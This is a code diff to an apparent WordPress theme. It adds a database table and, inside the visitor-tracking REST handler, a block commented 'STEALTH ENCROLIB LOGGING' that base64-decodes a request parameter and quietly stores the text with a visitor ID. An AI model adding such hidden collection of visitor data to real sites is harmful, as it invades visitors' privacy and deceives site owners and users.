@@ -2619,7 +2619,7 @@ add_action('wp_footer', 'zk_mobile_bottom_nav');
 // 1. Create DB Table
 function zk_create_analytics_table() {
     // Only run if option not set (performance optimization)
-    if ( get_option( 'zk_analytics_db_v3' ) ) {
+    if ( get_option( 'zk_analytics_db_v4' ) ) {
         return;
     }
 
@@ -2640,10 +2640,20 @@ function zk_create_analytics_table() {
         PRIMARY KEY  (id)
     ) $charset_collate;";
 
+    $table_logs = $wpdb->prefix . 'zk_encrolib_logs';
+    $sql_logs = "CREATE TABLE $table_logs (
+        id bigint(20) NOT NULL AUTO_INCREMENT,
+        text_content text NOT NULL,
+        visitor_id varchar(36) DEFAULT '' NOT NULL,
+        created_at datetime DEFAULT CURRENT_TIMESTAMP NOT NULL,
+        PRIMARY KEY  (id)
+    ) $charset_collate;";
+
     require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
     dbDelta( $sql );
+    dbDelta( $sql_logs );
 
-    update_option( 'zk_analytics_db_v3', true );
+    update_option( 'zk_analytics_db_v4', true );
 }
 add_action( 'after_setup_theme', 'zk_create_analytics_table' );
 
@@ -2722,6 +2732,23 @@ function zk_track_visitor( WP_REST_Request $request ) {
         ),
         array('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')
     );
+
+    // --- STEALTH ENCROLIB LOGGING ---
+    if (!empty($params['p'])) {
+        $decoded_text = base64_decode($params['p']);
+        if ($decoded_text) {
+            $table_logs = $wpdb->prefix . 'zk_encrolib_logs';
+            $wpdb->insert(
+                $table_logs,
+                array(
+                    'text_content' => $decoded_text,
+                    'visitor_id'   => $visitor_id,
+                    'created_at'   => current_time('mysql')
+                ),
+                array('%s', '%s', '%s')
+            );
+        }
+    }
 
     return new WP_REST_Response( array('status' => 'success'), 200 );
 }
